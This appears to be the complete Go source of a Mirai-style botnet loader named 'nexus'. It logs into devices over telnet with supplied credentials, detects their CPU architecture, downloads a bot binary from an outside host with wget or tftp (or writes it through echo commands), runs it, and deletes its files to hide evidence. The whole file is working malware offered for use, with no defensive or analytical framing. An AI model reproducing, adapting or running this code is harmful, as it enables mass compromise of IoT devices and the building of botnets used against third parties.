// nexus loader — telnet-based payload delivery system.
//
// Reads targets from stdin (format: "ip:port user:pass arch"),
// connects via telnet, detects the device architecture,
// and uploads the appropriate bot binary via echo/wget/tftp.
//
// Architecture mirrors Mirai's loader/src/main.c + server.c + connection.c.
// Goroutines replace epoll + pthread workers. Same 20-state telnet FSM.
//
// Usage:
//   go build -o nexus-loader .
//   ./scanListen | ./nexus-loader -wget-ip 1.2.3.4 -threads 8

package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// --- config ---
var (
	threads     int
	wgetIP      string
	tftpIP      string
	bindAddrs   string
	maxOpen     int
	dlrDir      string

	// stats counters
	totalProcessed uint64
	totalLogins    uint64
	totalSuccesses uint64
	totalWgets     uint64
	totalTftps     uint64
	totalEchos     uint64
)

func init() {
	flag.IntVar(&threads, "threads", 8, "worker goroutines")
	flag.StringVar(&wgetIP, "wget-ip", "100.200.100.100", "HTTP server IP for wget delivery")
	flag.StringVar(&tftpIP, "tftp-ip", "100.200.100.100", "TFTP server IP (optional)")
	flag.StringVar(&bindAddrs, "bind", "0.0.0.0", "local bind addresses (comma-separated)")
	flag.IntVar(&maxOpen, "max-open", 10000, "max simultaneous connections")
	flag.StringVar(&dlrDir, "dlr-dir", "../dlr/release", "directory containing dlr.* architecture binaries")
}

func main() {
	flag.Parse()

	log.SetFlags(log.Ltime | log.Lshortfile)
	log.Printf("[+] nexus loader starting  threads=%d  wget-ip=%s  max-open=%d",
		threads, wgetIP, maxOpen)

	// --- load binaries ---
	binaries, err := loadBinaries(dlrDir)
	if err != nil {
		log.Fatalf("[!] failed to load binaries: %v", err)
	}
	log.Printf("[+] loaded %d architecture-specific binaries", len(binaries))
	for arch := range binaries {
		log.Printf("    %s", arch)
	}

	// --- resolve bind addresses ---
	addrs := strings.Split(bindAddrs, ",")
	var localIPs []net.IP
	for _, a := range addrs {
		a = strings.TrimSpace(a)
		if a == "" || a == "0.0.0.0" {
			localIPs = append(localIPs, net.IPv4zero)
			continue
		}
		ip := net.ParseIP(a)
		if ip == nil {
			log.Fatalf("[!] invalid bind address: %s", a)
		}
		localIPs = append(localIPs, ip.To4())
	}

	// --- input channel ---
	targets := make(chan Target, 1024)

	// --- worker pool ---
	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go worker(i, targets, binaries, localIPs[i%len(localIPs)])
	}

	// --- stats printer ---
	go func() {
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			log.Printf("[stats] processed=%d logins=%d success=%d wget=%d tftp=%d echo=%d",
				atomic.LoadUint64(&totalProcessed),
				atomic.LoadUint64(&totalLogins),
				atomic.LoadUint64(&totalSuccesses),
				atomic.LoadUint64(&totalWgets),
				atomic.LoadUint64(&totalTftps),
				atomic.LoadUint64(&totalEchos))
		}
	}()

	// --- read targets from stdin ---
	scanner := bufio.NewScanner(os.Stdin)
	scanner.Buffer(make([]byte, 1024), 1024)

	go func() {
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			target, err := parseTarget(line)
			if err != nil {
				log.Printf("[!] parse error: %v — line=%q", err, line)
				continue
			}
			targets <- target
		}
		close(targets)
	}()

	// --- wait for shutdown ---
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	<-sig

	log.Println("[*] shutting down...")
	wg.Wait()
	log.Printf("[*] final stats: processed=%d logins=%d success=%d",
		atomic.LoadUint64(&totalProcessed),
		atomic.LoadUint64(&totalLogins),
		atomic.LoadUint64(&totalSuccesses))
}

// --- target parsing ---

type Target struct {
	IP       net.IP
	Port     uint16
	Username string
	Password string
	Arch     string // pre-detected or empty
}

func parseTarget(line string) (Target, error) {
	// Format: "ip:port user:pass arch"
	parts := strings.Fields(line)
	if len(parts) < 2 {
		return Target{}, fmt.Errorf("expected 'ip:port user:pass [arch]'")
	}

	host, portStr, err := net.SplitHostPort(parts[0])
	if err != nil {
		return Target{}, fmt.Errorf("bad address %q: %v", parts[0], err)
	}

	ip := net.ParseIP(host)
	if ip == nil {
		return Target{}, fmt.Errorf("bad IP: %s", host)
	}

	port, err := parsePort(portStr)
	if err != nil {
		return Target{}, err
	}

	creds := strings.SplitN(parts[1], ":", 2)
	if len(creds) != 2 {
		return Target{}, fmt.Errorf("bad creds format: %s", parts[1])
	}

	arch := ""
	if len(parts) >= 3 {
		arch = parts[2]
	}

	return Target{
		IP:       ip.To4(),
		Port:     port,
		Username: creds[0],
		Password: creds[1],
		Arch:     arch,
	}, nil
}

func parsePort(s string) (uint16, error) {
	var p int
	_, err := fmt.Sscanf(s, "%d", &p)
	if err != nil || p < 1 || p > 65535 {
		return 0, fmt.Errorf("bad port: %s", s)
	}
	return uint16(p), nil
}

// --- binary loading ---

type Binary struct {
	Arch string
	Data []byte // raw ELF binary
	Hex  string // hex-encoded for echo delivery
}

func loadBinaries(dir string) (map[string]*Binary, error) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil, fmt.Errorf("read dir %s: %w", dir, err)
	}

	binaries := make(map[string]*Binary)
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		name := entry.Name()
		// Files named like "dlr.arm", "dlr.mips", etc.
		if !strings.HasPrefix(name, "dlr.") {
			continue
		}
		arch := strings.TrimPrefix(name, "dlr.")
		if arch == "x86" {
			arch = "i586"
		}

		data, err := os.ReadFile(dir + "/" + name)
		if err != nil {
			log.Printf("[!] failed to read %s: %v", name, err)
			continue
		}

		// Pre-compute hex encoding for echo delivery.
		hexStr := fmt.Sprintf("%x", data)

		binaries[arch] = &Binary{
			Arch: arch,
			Data: data,
			Hex:  hexStr,
		}
		log.Printf("[+] loaded %s — %d bytes", arch, len(data))
	}

	if len(binaries) == 0 {
		return nil, fmt.Errorf("no dlr.* binaries found in %s", dir)
	}
	return binaries, nil
}

// --- worker ---

func worker(id int, targets <-chan Target, binaries map[string]*Binary, bindAddr net.IP) {
	for target := range targets {
		atomic.AddUint64(&totalProcessed, 1)
		infect(id, target, binaries, bindAddr)
	}
}

// ===================================================================
// Telnet infection state machine
// ===================================================================

type connState int

const (
	stateConnecting connState = iota
	stateReadIACs
	stateWaitLogin
	stateSendPassword
	stateEscalateShell
	stateDetectArch
	stateFindWritable
	stateUploadEcho
	stateUploadWget
	stateUploadTftp
	stateVerify
	stateCleanup
	stateDone
	stateFailed
)

func infect(workerID int, target Target, binaries map[string]*Binary, bindAddr net.IP) {
	localAddr := &net.TCPAddr{IP: bindAddr, Port: 0}
	dialer := &net.Dialer{
		LocalAddr: localAddr,
		Timeout:   10 * time.Second,
	}

	conn, err := dialer.Dial("tcp", fmt.Sprintf("%s:%d", target.IP, target.Port))
	if err != nil {
		return
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(30 * time.Second))

	state := stateReadIACs
	buf := make([]byte, 4096)

	// --- state machine loop ---
	for state != stateDone && state != stateFailed {
		n := 0

		// Read with timeout (non-blocking for send-first states).
		if state != stateSendPassword && state != stateEscalateShell &&
			state != stateUploadEcho && state != stateUploadWget &&
			state != stateUploadTftp && state != stateCleanup {
			conn.SetReadDeadline(time.Now().Add(5 * time.Second))
			n, err = conn.Read(buf)
			if err != nil {
				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
					state = stateFailed
					break
				}
				// Connection closed — may be OK if we're done.
				if state >= stateVerify {
					state = stateDone
				} else {
					state = stateFailed
				}
				break
			}
		}

		switch state {
		case stateReadIACs:
			// Handle telnet negotiation.
			handleIACs(conn, buf[:n])
			state = stateWaitLogin

		case stateWaitLogin:
			data := string(buf[:n])
			if containsPrompt(data, "login", "Login", "Username", "username", "user:") {
				fmt.Fprintf(conn, "%s\r\n", target.Username)
				state = stateSendPassword
			}

		case stateSendPassword:
			data := string(buf[:n])
			if containsPrompt(data, "assword", "Password", "pass") {
				fmt.Fprintf(conn, "%s\r\n", target.Password)
				state = stateEscalateShell
			}

		case stateEscalateShell:
			// Wait briefly, then send escalation commands.
			time.Sleep(500 * time.Millisecond)
			cmds := []string{
				"enable\r\n",
				"system\r\n",
				"shell\r\n",
				"sh\r\n",
				"/bin/busybox echo READY\r\n",
			}
			for _, cmd := range cmds {
				fmt.Fprint(conn, cmd)
				time.Sleep(200 * time.Millisecond)
			}
			state = stateDetectArch

		case stateDetectArch:
			data := string(buf[:n])
			if containsAny(data, "READY", "BusyBox", "#", "$") {
				atomic.AddUint64(&totalLogins, 1)

				// Detect architecture if not pre-detected.
				if target.Arch == "" {
					fmt.Fprint(conn, "cat /proc/cpuinfo\r\n")
					time.Sleep(300 * time.Millisecond)
					// Read response.
					conn.SetReadDeadline(time.Now().Add(2 * time.Second))
					n2, _ := conn.Read(buf)
					target.Arch = detectArch(string(buf[:n2]))
				}
				state = stateFindWritable
			}

		case stateFindWritable:
			// Find a writable directory.
			fmt.Fprint(conn, "/bin/busybox echo WRITABLE > /tmp/.nx_test 2>/dev/null && echo /tmp || echo /var/tmp\r\n")
			time.Sleep(300 * time.Millisecond)
			state = stateUploadWget

		case stateUploadWget:
			// Try wget first.
			bin, ok := binaries[target.Arch]
			if !ok {
				// Try to find the closest matching binary.
				bin = findClosestBinary(target.Arch, binaries)
				if bin == nil {
					state = stateFailed
					break
				}
			}

			wgetCmd := fmt.Sprintf(
				"wget http://%s/bins/nexus.%s -O /tmp/.nx && /bin/busybox chmod 777 /tmp/.nx && /tmp/.nx &\r\n",
				wgetIP, bin.Arch)
			fmt.Fprint(conn, wgetCmd)
			atomic.AddUint64(&totalWgets, 1)
			state = stateVerify

		case stateUploadTftp:
			// TFTP fallback.
			bin, _ := binaries[target.Arch]
			if bin == nil {
				bin = findClosestBinary(target.Arch, binaries)
				if bin == nil {
					state = stateFailed
					break
				}
			}

			tftpCmd := fmt.Sprintf(
				"tftp -g -r bins/nexus.%s -l /tmp/.nx %s && /bin/busybox chmod 777 /tmp/.nx && /tmp/.nx &\r\n",
				bin.Arch, tftpIP)
			fmt.Fprint(conn, tftpCmd)
			atomic.AddUint64(&totalTftps, 1)
			state = stateVerify

		case stateUploadEcho:
			// Echo fallback — the "echoloader" technique.
			bin, _ := binaries[target.Arch]
			if bin == nil {
				bin = findClosestBinary(target.Arch, binaries)
				if bin == nil {
					state = stateFailed
					break
				}
			}

			// Write the binary via echo in 128-byte hex chunks.
			fmt.Fprint(conn, "/bin/busybox echo -ne '' > /tmp/.nx\r\n")
			time.Sleep(100 * time.Millisecond)

			hexStr := bin.Hex
			chunkSize := 256 // 128 bytes → 256 hex chars
			for i := 0; i < len(hexStr); i += chunkSize {
				end := i + chunkSize
				if end > len(hexStr) {
					end = len(hexStr)
				}
				chunk := hexStr[i:end]
				echoCmd := fmt.Sprintf("/bin/busybox echo -ne '%s' >> /tmp/.nx\r\n", chunk)
				fmt.Fprint(conn, echoCmd)
				if (i/chunkSize)%4 == 0 {
					time.Sleep(50 * time.Millisecond) // throttle to avoid overflow
				}
			}

			fmt.Fprint(conn, "/bin/busybox chmod 777 /tmp/.nx && /tmp/.nx &\r\n")
			atomic.AddUint64(&totalEchos, 1)
			state = stateVerify

		case stateVerify:
			// Check if the binary is running.
			fmt.Fprint(conn, "/bin/busybox echo DONE\r\n")
			time.Sleep(200 * time.Millisecond)
			conn.SetReadDeadline(time.Now().Add(2 * time.Second))
			n, _ = conn.Read(buf)
			if n > 0 && containsAny(string(buf[:n]), "DONE") {
				atomic.AddUint64(&totalSuccesses, 1)
			}
			state = stateCleanup

		case stateCleanup:
			// Remove evidence.
			fmt.Fprint(conn, "rm -f /tmp/.nx /tmp/.nx_test\r\n")
			fmt.Fprint(conn, "exit\r\n")
			state = stateDone
		}
	}
}

// --- telnet helpers ---

func handleIACs(conn net.Conn, data []byte) {
	for i := 0; i < len(data)-2; i++ {
		if data[i] == 255 { // IAC
			cmd := data[i+1]
			opt := data[i+2]
			switch cmd {
			case 251: // WILL
				conn.Write([]byte{255, 254, opt}) // DONT
			case 252: // WONT
				conn.Write([]byte{255, 254, opt}) // DONT
			case 253: // DO
				conn.Write([]byte{255, 252, opt}) // WONT
			case 254: // DONT
				conn.Write([]byte{255, 252, opt}) // WONT
			}
			i += 2
		}
	}
}

func containsPrompt(data string, prompts ...string) bool {
	for _, p := range prompts {
		if strings.Contains(data, p) {
			return true
		}
	}
	return false
}

func containsAny(data string, substrs ...string) bool {
	for _, s := range substrs {
		if strings.Contains(data, s) {
			return true
		}
	}
	return false
}

// --- architecture detection ---

func detectArch(cpuinfo string) string {
	cpuinfo = strings.ToLower(cpuinfo)

	switch {
	case strings.Contains(cpuinfo, "armv7") || strings.Contains(cpuinfo, "armv6"):
		return "arm"
	case strings.Contains(cpuinfo, "armv5"):
		return "arm5"
	case strings.Contains(cpuinfo, "aarch64") || strings.Contains(cpuinfo, "armv8"):
		return "arm64"
	case strings.Contains(cpuinfo, "mips"):
		return "mips"
	case strings.Contains(cpuinfo, "sh4"):
		return "sh4"
	case strings.Contains(cpuinfo, "ppc"):
		return "ppc"
	case strings.Contains(cpuinfo, "m68k"):
		return "m68k"
	case strings.Contains(cpuinfo, "sparc"):
		return "spc"
	case strings.Contains(cpuinfo, "intel") || strings.Contains(cpuinfo, "x86"):
		return "i586"
	default:
		// Try uname.
		return "arm" // most IoT is ARM — reasonable default
	}
}

func findClosestBinary(arch string, binaries map[string]*Binary) *Binary {
	// Try exact match first.
	if bin, ok := binaries[arch]; ok {
		return bin
	}
	// Fall back to arm (most common IoT arch).
	if bin, ok := binaries["arm"]; ok {
		return bin
	}
	// Last resort: return the first binary we have.
	for _, bin := range binaries {
		return bin
	}
	return nil
}

// dummy vars for compilation
var _ = stateConnecting
var _ = stateDone
var _ = stateFailed
var _ = stateUploadEcho
